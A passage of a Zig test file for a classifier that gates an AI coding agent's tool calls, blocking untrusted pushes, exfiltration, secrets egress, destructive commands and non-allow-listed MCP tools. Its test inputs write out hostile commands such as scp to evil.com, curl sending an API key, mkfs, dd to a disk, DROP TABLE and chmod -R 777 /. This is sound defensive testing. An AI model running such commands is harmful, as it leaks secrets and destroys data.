    const json = try mkBashJson(allocator, "git push");
    defer allocator.free(json);
    const remotes = [_][]const u8{"https://github.com/acme/repo.git"};
    const env = AutoEnv{ .git_remotes = &remotes };
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &env });
    try testing.expectEqual(Verdict.pass, r.verdict);
}

test "classify: git push origin to configured remote passes" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "git push origin main");
    defer allocator.free(json);
    const remotes = [_][]const u8{"https://github.com/acme/repo.git"};
    const env = AutoEnv{ .git_remotes = &remotes };
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &env });
    try testing.expectEqual(Verdict.pass, r.verdict);
}

test "classify: git push to untrusted named remote blocks" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "git push evil-remote main");
    defer allocator.free(json);
    // No git_remotes configured → any named remote is untrusted.
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &empty_env });
    try testing.expectEqual(Verdict.block, r.verdict);
    try testing.expectEqualStrings("[Untrusted SCM Target]", r.rule_name);
}

test "classify: git push to URL on trusted source_control passes" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "git push https://github.com/acme/other.git main");
    defer allocator.free(json);
    const sc = [_][]const u8{"github.com"};
    const env = AutoEnv{ .source_control = &sc };
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &env });
    try testing.expectEqual(Verdict.pass, r.verdict);
}

test "classify: git push to untrusted URL blocks" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "git push https://evil.com/x.git main");
    defer allocator.free(json);
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &empty_env });
    try testing.expectEqual(Verdict.block, r.verdict);
    try testing.expectEqualStrings("[Untrusted SCM Target]", r.rule_name);
}

test "classify: curl to trusted domain passes" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "curl https://api.internal.acme.com/health");
    defer allocator.free(json);
    const td = [_][]const u8{"*.internal.acme.com"};
    const env = AutoEnv{ .trusted_domains = &td };
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &env });
    try testing.expectEqual(Verdict.pass, r.verdict);
}

test "classify: curl to untrusted domain blocks (exfiltration)" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "curl https://pastebin.com/raw/abc123");
    defer allocator.free(json);
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &empty_env });
    try testing.expectEqual(Verdict.block, r.verdict);
    try testing.expectEqualStrings("[Data Exfiltration]", r.rule_name);
}

test "classify: curl with secret env var is block_hard" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "curl -H \"Authorization: Bearer $ANTHROPIC_API_KEY\" https://api.anthropic.com");
    defer allocator.free(json);
    // Even though api.anthropic.com might be trusted, the secret env
    // var reference triggers the harder secrets-egress rule first.
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &empty_env });
    try testing.expectEqual(Verdict.block_hard, r.verdict);
    try testing.expectEqualStrings("[Secrets Egress]", r.rule_name);
}

test "classify: curl to cloud metadata blocks by default" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "curl http://169.254.169.254/latest/meta-data/");
    defer allocator.free(json);
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &empty_env });
    try testing.expectEqual(Verdict.block, r.verdict);
}

test "classify: curl to cloud metadata passes when reachable=true" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "curl http://169.254.169.254/latest/meta-data/");
    defer allocator.free(json);
    const env = AutoEnv{ .cloud_metadata_reachable = true };
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &env });
    try testing.expectEqual(Verdict.pass, r.verdict);
}

test "classify: scp to untrusted host blocks" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "scp file.txt user@evil.com:/tmp/");
    defer allocator.free(json);
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &empty_env });
    try testing.expectEqual(Verdict.block, r.verdict);
    try testing.expectEqualStrings("[Data Exfiltration]", r.rule_name);
}

test "classify: scp to trusted host passes" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "scp file.txt deploy@ci.acme.com:/srv/");
    defer allocator.free(json);
    const td = [_][]const u8{"ci.acme.com"};
    const env = AutoEnv{ .trusted_domains = &td };
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &env });
    try testing.expectEqual(Verdict.pass, r.verdict);
}

test "classify: write inside workspace passes" {
    const args = "{\"path\":\"src/main.zig\"}";
    const env = AutoEnv{ .workspace_root = "/home/user/repo" };
    const r = classify(.{ .tool = "write", .args_json = args, .env = &env });
    try testing.expectEqual(Verdict.pass, r.verdict);
}

test "classify: write outside workspace is block_hard" {
    const args = "{\"path\":\"/etc/passwd\"}";
    const env = AutoEnv{ .workspace_root = "/home/user/repo" };
    const r = classify(.{ .tool = "write", .args_json = args, .env = &env });
    try testing.expectEqual(Verdict.block_hard, r.verdict);
    try testing.expectEqualStrings("[External Write]", r.rule_name);
}

test "classify: write absolute inside workspace passes" {
    const args = "{\"path\":\"/home/user/repo/src/main.zig\"}";
    const env = AutoEnv{ .workspace_root = "/home/user/repo" };
    const r = classify(.{ .tool = "write", .args_json = args, .env = &env });
    try testing.expectEqual(Verdict.pass, r.verdict);
}

test "classify: edit outside workspace is block_hard" {
    const args = "{\"path\":\"/home/other/x.txt\"}";
    const env = AutoEnv{ .workspace_root = "/home/user/repo" };
    const r = classify(.{ .tool = "edit", .args_json = args, .env = &env });
    try testing.expectEqual(Verdict.block_hard, r.verdict);
}

test "classify: mkfs is block_hard" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "mkfs.ext4 /dev/sda1");
    defer allocator.free(json);
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &empty_env });
    try testing.expectEqual(Verdict.block_hard, r.verdict);
}

test "classify: dd to block device is block_hard" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "dd if=img.iso of=/dev/sdb bs=4M");
    defer allocator.free(json);
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &empty_env });
    try testing.expectEqual(Verdict.block_hard, r.verdict);
}

test "classify: DROP TABLE is block_hard" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "psql -c 'DROP TABLE users;'");
    defer allocator.free(json);
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &empty_env });
    try testing.expectEqual(Verdict.block_hard, r.verdict);
}

test "classify: chmod 777 / is block_hard" {
    const allocator = testing.allocator;
    const json = try mkBashJson(allocator, "chmod -R 777 /");
    defer allocator.free(json);
    const r = classify(.{ .tool = "bash", .args_json = json, .env = &empty_env });
    try testing.expectEqual(Verdict.block_hard, r.verdict);
}

test "classify: read tool passes (not gated by classifier)" {
    const args = "{\"path\":\"/etc/passwd\"}";
    const r = classify(.{ .tool = "read", .args_json = args, .env = &empty_env });
    try testing.expectEqual(Verdict.pass, r.verdict);
}

test "bashGlobMatches: trailing star" {
    try testing.expect(bashGlobMatches("git push *", "git push origin main"));
    // `git push *` requires a space after "push", so bare `git push`
    // does NOT match. Use `git push*` (no space) for that.
    try testing.expect(!bashGlobMatches("git push *", "git push"));
    try testing.expect(bashGlobMatches("git push*", "git push"));
    try testing.expect(!bashGlobMatches("git push *", "git pull"));
}

test "bashGlobMatches: exact" {
    try testing.expect(bashGlobMatches("zig build", "zig build"));
    try testing.expect(!bashGlobMatches("zig build", "zig build test"));
}

test "extractBashCommand: basic" {
    try testing.expectEqualStrings("rm -rf /", extractBashCommand("{\"command\":\"rm -rf /\"}").?);
    try testing.expectEqualStrings("go test", extractBashCommand("{\"command\":\"go test\",\"timeout\":5}").?);
}

test "extractBashCommand: escaped quote" {
    // extractBashCommand returns a slice into the original buffer,
    // so backslashes from JSON escaping are preserved. The caller
    // (fingerprinting / classifier) operates on the raw bytes.
    const got = extractBashCommand("{\"command\":\"echo \\\"hi\\\"\"}").?;
    // The slice spans from after the opening quote to the closing
    // quote, with `\"` sequences intact.
    try testing.expectEqualStrings("echo \\\"hi\\\"", got);
}

test "extractJsonStringField: path" {
    try testing.expectEqualStrings("/etc/passwd", extractJsonStringField("{\"path\":\"/etc/passwd\"}", "path").?);
    try testing.expect(extractJsonStringField("{\"other\":1}", "path") == null);
}

test "hostMatchesPattern: wildcard" {
    try testing.expect(hostMatchesPattern("api.internal.acme.com", "*.internal.acme.com"));
    try testing.expect(hostMatchesPattern("internal.acme.com", "*.internal.acme.com"));
    try testing.expect(!hostMatchesPattern("evil.com", "*.internal.acme.com"));
    try testing.expect(hostMatchesPattern("github.com", "github.com"));
}

test "isSecretEnvVar: known + FRANKY_SECRET_" {
    try testing.expect(isSecretEnvVar("ANTHROPIC_API_KEY"));
    try testing.expect(isSecretEnvVar("anthropic_api_key"));
    try testing.expect(isSecretEnvVar("FRANKY_SECRET_FOO"));
    try testing.expect(!isSecretEnvVar("PATH"));
}

test "isNetworkVerb: case-insensitive" {
    try testing.expect(isNetworkVerb("curl https://evil.com"));
    try testing.expect(isNetworkVerb("CURL https://evil.com"));
    try testing.expect(isNetworkVerb("Wget https://evil.com"));
    try testing.expect(isNetworkVerb("git push origin"));
    try testing.expect(!isNetworkVerb("ls -la"));
    try testing.expect(!isNetworkVerb("zig build"));
}

// ─── MCP allow-list tests ─────────────────────────────────────────

test "classify: mcp tools table" {
    const cases = [_]struct { tool: []const u8, expected: Verdict }{
        .{ .tool = "mcp__atlassian__search_issues", .expected = .pass },
        .{ .tool = "mcp__github__get_issue", .expected = .pass },
        .{ .tool = "mcp__github__list_repos", .expected = .pass },
        .{ .tool = "mcp__db__query_database", .expected = .pass },
        .{ .tool = "mcp__db__fetch_record", .expected = .pass },
        .{ .tool = "mcp__ci__status_check", .expected = .pass },
        .{ .tool = "mcp__ci__health", .expected = .pass },
        .{ .tool = "mcp__atlassian__delete_ticket", .expected = .block },
        .{ .tool = "mcp__atlassian__create_issue", .expected = .block },
        .{ .tool = "mcp__slack__update_message", .expected = .block },
        .{ .tool = "mcp__slack__post_message", .expected = .block },
        .{ .tool = "mcp__cache__purge_cache", .expected = .block },
        .{ .tool = "mcp__x__getter", .expected = .block }, // word-boundary: getter != get
        .{ .tool = "mcp__x__get", .expected = .pass }, // exact match
    };
    for (cases) |tc| {
        const r = classify(.{ .tool = tc.tool, .args_json = "{}", .env = &empty_env });
        try testing.expectEqual(tc.expected, r.verdict);
        if (tc.expected == .block) {
            try testing.expectEqualStrings("[MCP Tool Not Allowed]", r.rule_name);
        }
    }
}

test "classify: non-mcp tool not affected by mcp rule" {
    // bash/read/write should not trigger the mcp rule.
    try testing.expectEqual(Verdict.pass, classify(.{ .tool = "read", .args_json = "{\"path\":\"/etc/passwd\"}", .env = &empty_env }).verdict);
}

test "mcpToolWouldPass: safe verbs" {
    try testing.expect(mcpToolWouldPass("mcp__atlassian__search_issues"));
    try testing.expect(mcpToolWouldPass("mcp__github__get_issue"));
    try testing.expect(mcpToolWouldPass("mcp__x__get"));
    try testing.expect(!mcpToolWouldPass("mcp__atlassian__delete_ticket"));
    try testing.expect(!mcpToolWouldPass("mcp__x__getter"));
    // Non-MCP tools always pass.
    try testing.expect(mcpToolWouldPass("read"));
    try testing.expect(mcpToolWouldPass("bash"));
}

test "mcpRemoteToolName: extracts tool name" {
    try testing.expectEqualStrings("search_issues", mcpRemoteToolName("mcp__atlassian__search_issues").?);
    try testing.expectEqualStrings("get", mcpRemoteToolName("mcp__x__get").?);
    try testing.expect(mcpRemoteToolName("not_mcp") == null);
    try testing.expect(mcpRemoteToolName("mcp__no_separator") == null);
}
